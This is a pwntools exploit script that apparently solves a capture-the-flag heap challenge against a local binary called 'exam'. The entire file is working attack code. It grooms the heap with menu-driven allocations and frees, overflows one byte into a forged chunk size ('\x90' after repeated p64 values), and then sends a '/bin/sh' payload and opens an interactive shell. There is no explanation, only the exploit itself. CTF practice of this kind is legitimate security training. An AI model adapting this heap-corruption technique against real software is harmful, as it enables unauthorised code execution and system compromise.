from pwn import *

file = './exam'

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

#conn = gdb.debug(file)
conn = process(file)

def add_sum(sum):
    conn.recvuntil("> ")
    conn.sendline("1")
    conn.recvuntil(":-)\n> ")
    conn.send(sum)

def remove_sum(i):
    conn.recvuntil("> ")
    conn.sendline("2")
    conn.recvuntil("remove?\n> ")
    conn.sendline(str(i))

def create_crib():
    conn.recvuntil(">")
    conn.sendline("4")
    conn.recvuntil("Result")

def tear_crib():
    conn.recvuntil(">")
    conn.sendline("5")
    conn.recvuntil("awesome, didn't it? :-)")

#add_sum(p64(144) * (128/8) + "\n")
add_sum("a"*127 + "\n")
add_sum("e"*127 + "\n")
add_sum("b"*127 + "\n")
add_sum("c"*127 + "\n")
add_sum("d"*127 + "\n")

remove_sum(2)

#add_sum("e"*127 + "\n")
add_sum(p64(144*3) * (128/8) + "\x90")

remove_sum(0)
remove_sum(3)

add_sum("a"*127 + "\n")
create_crib()
add_sum("ITSMAGIC"*8 + "/bin/sh" + "\n")

conn.sendline("6")
conn.sendline("2")

conn.interactive()
